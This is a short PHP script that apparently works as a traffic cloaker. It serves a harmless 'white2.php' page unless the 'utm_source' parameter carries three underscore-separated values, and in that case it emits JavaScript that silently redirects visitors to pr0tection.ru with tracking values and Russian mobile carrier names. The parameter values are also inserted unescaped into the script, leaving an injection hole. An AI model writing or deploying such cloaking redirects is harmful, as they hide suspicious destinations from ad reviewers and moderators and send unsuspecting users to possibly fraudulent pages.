<?php
if (empty($_GET['utm_source'])) { 
	include 'white2.php';
	return;
}  

$a = $_GET['utm_source'];	

if(empty(explode("_", $a)[0]))
{ 
	include 'white2.php';
	return;
}

if(empty(explode("_", $a)[1]))
{ 
	include 'white2.php';
	return;
}

if(empty(explode("_", $a)[2]))
{ 
	include 'white2.php';
	return;
}

	$s1 = explode("_", $a)[0];
    $s2 = explode("_", $a)[1];
	$s3 = explode("_", $a)[2];
	echo '<!doctype><html><header> <style>body {margin: 0;}</style></header><body>';  
	echo "<script>window.location = 'http://pr0tection.ru/f5c686212efeec6f/$s1/$s2/$s3?track_id=f5c686212efeec6f&beeline&megafon'</script></body></html>"; 
?>